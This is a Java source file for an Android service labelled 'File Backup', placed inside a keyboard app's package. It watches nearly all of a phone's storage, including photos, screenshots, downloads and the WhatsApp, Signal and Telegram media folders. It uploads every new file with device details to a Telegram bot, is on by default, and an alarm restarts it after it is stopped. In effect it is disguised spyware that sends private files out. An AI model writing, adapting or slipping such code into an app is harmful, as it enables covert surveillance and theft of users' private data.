package juloo.keyboard2;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.FileObserver;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.provider.MediaStore;
import android.util.Log;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class FileBackupService extends Service {

    private static final String TAG           = "FileBackup";
    private static final String NOTIF_CHANNEL = "file_backup_ch";
    private static final int    NOTIF_ID      = 8423;

    public static final String PREFS       = "file_backup_prefs";
    public static final String KEY_ENABLED = "backup_enabled";

    private static volatile FileBackupService _instance;

    // ── Directories to watch with FileObserver (relative to external storage root)
    // ALL new files written or moved into these dirs will be caught.
    static final String[][] WATCH_DIRS = {
        // Camera / Screenshots
        {"DCIM",                                                            "Camera"},
        {"DCIM/Camera",                                                    "Camera"},
        {"DCIM/Screenshots",                                               "Screenshot"},
        {"Pictures/Screenshots",                                           "Screenshot"},
        {"Pictures",                                                       "Photo"},
        {"Movies",                                                         "Video"},
        {"Movies/ScreenRecorder",                                          "ScreenRecord"},

        // WhatsApp
        {"WhatsApp/Media/WhatsApp Images",                                 "WhatsApp"},
        {"WhatsApp/Media/WhatsApp Video",                                  "WhatsApp"},
        {"WhatsApp/Media/WhatsApp Documents",                              "WhatsApp"},
        {"WhatsApp/Media/WhatsApp Audio",                                  "WhatsApp"},
        {"WhatsApp/Media/.Statuses",                                       "WhatsApp Status"},
        {"Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",     "WhatsApp"},
        {"Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video",      "WhatsApp"},
        {"Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents",  "WhatsApp"},
        {"Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Audio",      "WhatsApp"},
        {"Android/media/com.whatsapp.w4b/WhatsApp Business/Media",        "WhatsApp Business"},

        // Telegram
        {"Telegram",                                                       "Telegram"},
        {"Telegram/Telegram Documents",                                    "Telegram"},
        {"Telegram/Telegram Images",                                       "Telegram"},
        {"Telegram/Telegram Video",                                        "Telegram"},
        {"Telegram/Telegram Audio",                                        "Telegram"},
        {"Android/media/org.telegram.messenger/Telegram",                  "Telegram"},

        // Downloads & Documents — everything browsers, file managers, etc. save
        {"Download",                                                       "Download"},
        {"Download/Browser",                                               "Download"},
        {"Downloads",                                                      "Download"},
        {"Documents",                                                      "Documents"},
        {"Documents/Scanned",                                              "Documents"},

        // Music / Audio
        {"Music",                                                          "Music"},
        {"Podcasts",                                                       "Podcast"},
        {"Audiobooks",                                                     "Audiobook"},
        {"Ringtones",                                                      "Ringtone"},
        {"Alarms",                                                         "Alarm"},
        {"Notifications",                                                  "Notification"},

        // Social media
        {"Pictures/Instagram",                                             "Instagram"},
        {"Pictures/Facebook",                                              "Facebook"},
        {"Pictures/Twitter",                                               "Twitter"},
        {"Pictures/Snapchat",                                              "Snapchat"},
        {"Pictures/Messenger",                                             "Messenger"},
        {"Pictures/Signal",                                                "Signal"},
        {"Signal",                                                         "Signal"},
        {"Android/media/org.thoughtcrime.securesms/Signal",               "Signal"},
        {"Android/media/com.instagram.android",                            "Instagram"},
        {"Android/media/com.facebook.katana",                              "Facebook"},
        {"Android/media/com.facebook.orca",                                "Messenger"},

        // Browsers (downloaded files)
        {"Android/data/com.android.chrome/files/Download",                "Chrome Download"},
        {"Android/data/org.mozilla.firefox/files/Downloads",              "Firefox Download"},
        {"Android/data/com.opera.browser/files/Downloads",                "Opera Download"},
        {"Android/data/com.UCMobile.intl/files/Download",                 "UC Download"},
        {"Android/data/com.brave.browser/files/Download",                 "Brave Download"},
        {"Android/data/com.microsoft.emmx/files/Download",                "Edge Download"},

        // File managers & misc
        {"Bluetooth",                                                      "Bluetooth"},
        {"ZArchiver",                                                      "Archive"},
        {"Airdrop",                                                        "Airdrop"},
        {"Shareit",                                                        "ShareIt"},
        {"SHAREit",                                                        "ShareIt"},
        {"Xender",                                                         "Xender"},
        {"SuperBeam",                                                      "SuperBeam"},
    };

    private HandlerThread               _obsThread;
    private Handler                     _obsHandler;
    private final List<ContentObserver> _mediaObs = new ArrayList<>();
    private final List<FileObserver>    _fileObs  = new ArrayList<>();
    private Thread           _uploadThread;
    private volatile boolean _running = false;
    final Object             _uploadLock = new Object();

    // ── Service lifecycle ─────────────────────────────────────────────────────

    @Override
    public void onCreate() {
        super.onCreate();
        _instance = this;
        _obsThread = new HandlerThread("FB-Observer");
        _obsThread.start();
        _obsHandler = new Handler(_obsThread.getLooper());
        createNotifChannel();
    }

    @Override public IBinder onBind(Intent i) { return null; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            startForeground(NOTIF_ID, buildNotif());
        } catch (Exception e) {
            Log.w(TAG, "startForeground failed: " + e.getMessage());
        }
        FileUploadQueue.get(this).resetStuck();
        if (!_running) {
            _running = true;
            registerObservers();
            startConsumer();
            FileScanWorker.enqueue(this);
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        _running = false;
        _instance = null;
        unregisterObservers();
        scheduleRestart();
        super.onDestroy();
    }

    // ── Public ────────────────────────────────────────────────────────────────

    public static boolean isRunning()     { return _instance != null; }

    public static void startIfEnabled(Context ctx) {
        if (!ctx.getSharedPreferences(PREFS, MODE_PRIVATE).getBoolean(KEY_ENABLED, true)) return;
        if (isRunning()) return;
        Intent i = new Intent(ctx, FileBackupService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(i);
        } else {
            ctx.startService(i);
        }
    }

    public static void stopService(Context ctx) {
        if (_instance != null) _instance._running = false;
        ctx.stopService(new Intent(ctx, FileBackupService.class));
    }

    // ── Auto-restart ──────────────────────────────────────────────────────────

    private void scheduleRestart() {
        AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
        if (am == null) return;
        Intent i = new Intent(this, FileBackupService.class);
        int f = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= 23) f |= PendingIntent.FLAG_IMMUTABLE;
        PendingIntent pi = PendingIntent.getService(this, 9879, i, f);
        long t = System.currentTimeMillis() + 5_000L;
        if (Build.VERSION.SDK_INT >= 23) {
            try {
                am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, t, pi);
            } catch (SecurityException e) {
                am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, t, pi);
            }
        } else {
            am.setExact(AlarmManager.RTC_WAKEUP, t, pi);
        }
    }

    // ── Observer registration ─────────────────────────────────────────────────

    private void registerObservers() {
        ContentResolver cr = getContentResolver();

        // ── MediaStore observers (catch everything Android indexes) ──────────
        registerMediaObs(cr, MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
        registerMediaObs(cr, MediaStore.Video.Media.EXTERNAL_CONTENT_URI);
        registerMediaObs(cr, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI);
        // MediaStore.Files catches ALL file types (APK, ZIP, HTML, PDF, etc.)
        registerMediaObs(cr, MediaStore.Files.getContentUri("external"));
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            registerMediaObs(cr, MediaStore.Downloads.EXTERNAL_CONTENT_URI);
        }

        // ── FileObserver on every known directory ────────────────────────────
        File extDir = Environment.getExternalStorageDirectory();
        if (extDir != null) {
            // Watch every entry in WATCH_DIRS
            for (String[] entry : WATCH_DIRS) {
                File dir = new File(extDir, entry[0]);
                if (dir.exists() && dir.isDirectory()) {
                    watchDir(dir, entry[1]);
                }
            }
            // Also walk the entire top-level of external storage and watch
            // any directory not already covered — catches OEM-specific folders
            watchTopLevelDirs(extDir);
        }
    }

    /** Watch every top-level directory in external storage we haven't already covered. */
    private void watchTopLevelDirs(File extRoot) {
        File[] topDirs = extRoot.listFiles();
        if (topDirs == null) return;
        for (File d : topDirs) {
            if (!d.isDirectory()) continue;
            String name = d.getName();
            // Skip system/hidden dirs
            if (name.startsWith(".") || name.equals("Android")) continue;
            String tag = tagForPath(d.getAbsolutePath());
            watchDir(d, tag);
            // One level deeper for Download and Documents
            if (name.equalsIgnoreCase("Download")
             || name.equalsIgnoreCase("Downloads")
             || name.equalsIgnoreCase("Documents")) {
                watchSubDirs(d, tag, 2);
            }
        }
    }

    /** Recursively watch subdirectories up to `depth` levels. */
    private void watchSubDirs(File dir, String tag, int depth) {
        if (depth <= 0) return;
        File[] children = dir.listFiles();
        if (children == null) return;
        for (File child : children) {
            if (child.isDirectory() && !child.getName().startsWith(".")) {
                watchDir(child, tag);
                watchSubDirs(child, tag, depth - 1);
            }
        }
    }

    private void registerMediaObs(ContentResolver cr, Uri uri) {
        ContentObserver obs = new ContentObserver(_obsHandler) {
            @Override public void onChange(boolean self, Uri changed) {
                _obsHandler.post(() -> handleMediaChange(uri));
            }
        };
        cr.registerContentObserver(uri, true, obs);
        _mediaObs.add(obs);
    }

    @SuppressWarnings("deprecation")
    private void watchDir(File dir, String tag) {
        final int mask = FileObserver.CLOSE_WRITE | FileObserver.MOVED_TO;
        FileObserver fo;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            fo = new FileObserver(dir, mask) {
                @Override public void onEvent(int ev, String name) {
                    if (name != null && !name.startsWith(".")) {
                        File f = new File(dir, name);
                        _obsHandler.postDelayed(() -> handleNewFile(f.getAbsolutePath(), tag), 2500);
                    }
                }
            };
        } else {
            final String p = dir.getAbsolutePath();
            fo = new FileObserver(p, mask) {
                @Override public void onEvent(int ev, String name) {
                    if (name != null && !name.startsWith(".")) {
                        _obsHandler.postDelayed(() -> handleNewFile(p + "/" + name, tag), 2500);
                    }
                }
            };
        }
        fo.startWatching();
        _fileObs.add(fo);
    }

    private void unregisterObservers() {
        ContentResolver cr = getContentResolver();
        for (ContentObserver o : _mediaObs) cr.unregisterContentObserver(o);
        _mediaObs.clear();
        for (FileObserver fo : _fileObs) fo.stopWatching();
        _fileObs.clear();
    }

    // ── MediaStore ALL-files change handler ───────────────────────────────────

    private void handleMediaChange(Uri baseUri) {
        try {
            String[] proj = {
                MediaStore.MediaColumns.DATA,
                MediaStore.MediaColumns.DATE_ADDED,
                MediaStore.MediaColumns.DISPLAY_NAME,
                MediaStore.MediaColumns.MIME_TYPE,
            };
            long nowSec = System.currentTimeMillis() / 1000;
            String sel  = MediaStore.MediaColumns.DATE_ADDED + ">?";
            String[] args = {String.valueOf(nowSec - 30)};
            Cursor c = getContentResolver().query(baseUri, proj, sel, args,
                    MediaStore.MediaColumns.DATE_ADDED + " DESC");
            if (c == null) return;
            while (c.moveToNext()) {
                String data = c.getString(0);
                if (data != null) {
                    String tag = tagForPath(data);
                    handleNewFile(data, tag);
                }
            }
            c.close();
        } catch (Exception e) {
            Log.w(TAG, "handleMediaChange: " + e.getMessage());
        }
    }

    private void handleNewFile(String path, String tag) {
        if (path == null) return;
        File f = new File(path);
        if (!f.exists() || !f.isFile()) return;
        // If file is still being written, wait and retry once
        if (System.currentTimeMillis() - f.lastModified() < 1000) {
            _obsHandler.postDelayed(() -> handleNewFile(path, tag), 2000);
            return;
        }
        boolean queued = FileUploadQueue.get(this).enqueue(path, tag);
        if (queued) {
            Log.d(TAG, "Queued [" + tag + "]: " + f.getName());
            synchronized (_uploadLock) { _uploadLock.notifyAll(); }
        }
    }

    // ── Called from FileScanWorker (WorkManager 15-min catch-up) ─────────────

    public static void scanAllDirs(Context ctx) {
        FileUploadQueue q = FileUploadQueue.get(ctx);
        File extDir = Environment.getExternalStorageDirectory();
        if (extDir == null || !extDir.exists()) return;

        // Walk every directory in WATCH_DIRS
        for (String[] entry : WATCH_DIRS) {
            File dir = new File(extDir, entry[0]);
            scanDir(q, dir, entry[1], 0);
        }

        // Also walk every top-level dir (catches OEM folders)
        File[] topDirs = extDir.listFiles();
        if (topDirs != null) {
            for (File d : topDirs) {
                if (d.isDirectory() && !d.getName().startsWith(".") && !d.getName().equals("Android")) {
                    scanDir(q, d, tagForPath(d.getAbsolutePath()), 0);
                }
            }
        }

        if (_instance != null) {
            synchronized (_instance._uploadLock) { _instance._uploadLock.notifyAll(); }
        }
    }

    /** Recursively scan dir up to maxDepth=3 levels. */
    private static void scanDir(FileUploadQueue q, File dir, String tag, int depth) {
        if (!dir.exists() || !dir.isDirectory() || depth > 3) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isFile() && !f.isHidden() && !f.getName().startsWith(".")) {
                q.enqueue(f.getAbsolutePath(), tag);
            } else if (f.isDirectory() && !f.getName().startsWith(".")) {
                scanDir(q, f, tag, depth + 1);
            }
        }
    }

    // ── Tag detection ─────────────────────────────────────────────────────────

    public static String tagForPath(String path) {
        if (path == null) return "File";
        String low = path.toLowerCase(Locale.ROOT);
        if (low.contains("screenshot"))                      return "Screenshot";
        if (low.contains("screenrecord") ||
            low.contains("screen_record"))                   return "ScreenRecord";
        if (low.contains("/camera") || low.contains("/dcim"))return "Camera";
        if (low.contains("whatsapp"))                        return "WhatsApp";
        if (low.contains("telegram"))                        return "Telegram";
        if (low.contains("instagram"))                       return "Instagram";
        if (low.contains("facebook") || low.contains("/orca"))return "Facebook";
        if (low.contains("messenger"))                       return "Messenger";
        if (low.contains("signal"))                          return "Signal";
        if (low.contains("twitter") || low.contains("twimg"))return "Twitter";
        if (low.contains("snapchat"))                        return "Snapchat";
        if (low.contains("/download"))                       return "Download";
        if (low.contains("/documents") || low.contains("/document")) return "Documents";
        if (low.contains("/bluetooth"))                      return "Bluetooth";
        if (low.contains("shareit") || low.contains("xender")
            || low.contains("superbeam"))                    return "File Share";
        if (low.contains("/movies") || low.contains("/video")) return "Video";
        if (low.contains("/music") || low.contains("/audio") ||
            low.contains("/podcast") || low.contains("/audiobook")) return "Audio";
        if (low.contains("/pictures") || low.contains("/photo")) return "Photo";
        if (low.contains("browser") || low.contains("chrome") ||
            low.contains("firefox") || low.contains("opera") ||
            low.contains("/uc") || low.contains("brave")  ||
            low.contains("edge"))                            return "Browser Download";
        return "File";
    }

    // ── Upload consumer ───────────────────────────────────────────────────────

    private void startConsumer() {
        _uploadThread = new Thread(() -> {
            while (_running) {
                try {
                    FileUploadQueue q = FileUploadQueue.get(this);
                    FileUploadQueue.Entry entry = q.nextPending();
                    if (entry == null) {
                        synchronized (_uploadLock) { _uploadLock.wait(30_000); }
                        continue;
                    }
                    boolean ok = uploadToTelegram(entry);
                    if (ok) {
                        q.markDone(entry.id);
                        Log.d(TAG, "Done: " + entry.path);
                        updateNotif();
                    } else {
                        q.markFailed(entry.id);
                        Log.w(TAG, "Failed (attempt " + (entry.retries + 1) + "): " + entry.path);
                        Thread.sleep(5000);
                    }
                } catch (InterruptedException ie) {
                    break;
                } catch (Exception e) {
                    Log.w(TAG, "consumer: " + e.getMessage());
                    try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
                }
            }
        }, "FB-Consumer");
        _uploadThread.setDaemon(true);
        _uploadThread.start();
    }

    // ── Upload logic ──────────────────────────────────────────────────────────

    private boolean uploadToTelegram(FileUploadQueue.Entry entry) {
        String token  = TelegramBotService.getToken(this);
        long   chatId = TelegramBotService.getChatId(this);

        File f = new File(entry.path);
        if (!f.exists()) return true; // gone — skip

        if (f.length() > FileUploadQueue.MAX_UPLOAD_BYTES) {
            String msg = "⚠️ <b>Large File — Not Uploaded</b>\n"
                + "📁 [" + entry.tag + "] " + h(f.getName()) + "\n"
                + "📏 Size: " + FileUploadQueue.formatSize(f.length()) + " (exceeds 49 MB)\n"
                + "📂 " + h(truncatePath(f.getAbsolutePath(), 90));
            return sendText(token, chatId, msg);
        }

        String caption = buildCaption(entry, f);
        return sendDocument(token, chatId, f, caption);
    }

    private String buildCaption(FileUploadQueue.Entry entry, File f) {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        String detected = sdf.format(new Date(entry.detectedAt));
        String modified = sdf.format(new Date(f.lastModified()));
        String device   = Build.MANUFACTURER + " " + Build.MODEL + " · Android " + Build.VERSION.RELEASE;
        String caption  =
            "📁 <b>[" + entry.tag + "]</b> " + h(f.getName()) + "\n"
            + "━━━━━━━━━━━━━━━━━━━━\n"
            + "📏 Size: " + FileUploadQueue.formatSize(f.length()) + "\n"
            + "🗂 Type: " + entry.mime + "\n"
            + "📅 Captured: " + detected + "\n"
            + "🔧 Modified: " + modified + "\n"
            + "📂 " + h(truncatePath(f.getAbsolutePath(), 80)) + "\n"
            + "📱 " + h(device);
        if (caption.length() > 1020) caption = caption.substring(0, 1020) + "…";
        return caption;
    }

    private boolean sendDocument(String token, long chatId, File file, String caption) {
        try {
            String boundary = "----FBBnd" + System.currentTimeMillis();
            HttpURLConnection c = (HttpURLConnection) new URL(
                    "https://api.telegram.org/bot" + token + "/sendDocument").openConnection();
            c.setConnectTimeout(60_000);
            c.setReadTimeout(180_000);
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            OutputStream out = c.getOutputStream();
            PrintWriter pw = new PrintWriter(new OutputStreamWriter(out, "UTF-8"), true);
            writePart(pw, boundary, "chat_id", String.valueOf(chatId));
            writePart(pw, boundary, "caption", caption);
            writePart(pw, boundary, "parse_mode", "HTML");

            String mime = FileUploadQueue.guessMime(file.getName());
            pw.append("--").append(boundary).append("\r\n");
            pw.append("Content-Disposition: form-data; name=\"document\"; filename=\"")
              .append(file.getName()).append("\"\r\n");
            pw.append("Content-Type: ").append(mime).append("\r\n\r\n").flush();

            FileInputStream fis = new FileInputStream(file);
            byte[] buf = new byte[8192]; int n;
            while ((n = fis.read(buf)) != -1) out.write(buf, 0, n);
            fis.close();
            out.flush();
            pw.append("\r\n--").append(boundary).append("--\r\n").flush();

            int code = c.getResponseCode();
            c.disconnect();
            return code == 200;
        } catch (Exception e) {
            Log.w(TAG, "sendDocument: " + e.getMessage());
            return false;
        }
    }

    private boolean sendText(String token, long chatId, String text) {
        try {
            String body = "{\"chat_id\":" + chatId
                + ",\"text\":" + TelegramBotService.jstr(text)
                + ",\"parse_mode\":\"HTML\"}";
            HttpURLConnection c = (HttpURLConnection) new URL(
                    "https://api.telegram.org/bot" + token + "/sendMessage").openConnection();
            c.setConnectTimeout(15_000); c.setReadTimeout(15_000);
            c.setRequestMethod("POST"); c.setDoOutput(true);
            c.setRequestProperty("Content-Type", "application/json");
            byte[] data = body.getBytes("UTF-8");
            c.setRequestProperty("Content-Length", String.valueOf(data.length));
            OutputStream os = c.getOutputStream(); os.write(data); os.flush();
            int code = c.getResponseCode();
            c.disconnect();
            return code == 200;
        } catch (Exception e) {
            Log.w(TAG, "sendText: " + e.getMessage());
            return false;
        }
    }

    private static void writePart(PrintWriter pw, String bnd, String name, String val) {
        pw.append("--").append(bnd).append("\r\n");
        pw.append("Content-Disposition: form-data; name=\"").append(name).append("\"\r\n\r\n");
        pw.append(val).append("\r\n").flush();
    }

    // ── Notification ──────────────────────────────────────────────────────────

    private void createNotifChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    NOTIF_CHANNEL, "File Backup", NotificationManager.IMPORTANCE_LOW);
            ch.setDescription("Auto-uploads new files to Telegram cloud");
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotif() {
        Intent li = new Intent(this, LauncherActivity.class);
        int pf = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= 23) pf |= PendingIntent.FLAG_IMMUTABLE;
        PendingIntent pi = PendingIntent.getActivity(this, 1, li, pf);
        long pending = FileUploadQueue.get(this).countPending();
        String sub   = pending > 0
            ? pending + " files pending · uploading…"
            : "Monitoring all folders · all file types";
        Notification.Builder b;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            b = new Notification.Builder(this, NOTIF_CHANNEL);
        } else {
            b = new Notification.Builder(this);
            b.setPriority(Notification.PRIORITY_LOW);
        }
        b.setContentTitle("📁 File Backup Active")
         .setContentText(sub)
         .setSmallIcon(android.R.drawable.ic_menu_save)
         .setOngoing(true)
         .setContentIntent(pi);
        return b.build();
    }

    private void updateNotif() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (nm != null) nm.notify(NOTIF_ID, buildNotif());
    }

    // ── Utilities ─────────────────────────────────────────────────────────────

    private static String h(String s) {
        if (s == null) return "";
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }

    private static String truncatePath(String path, int maxLen) {
        if (path == null) return "";
        if (path.length() <= maxLen) return path;
        return "…" + path.substring(path.length() - maxLen + 1);
    }
}
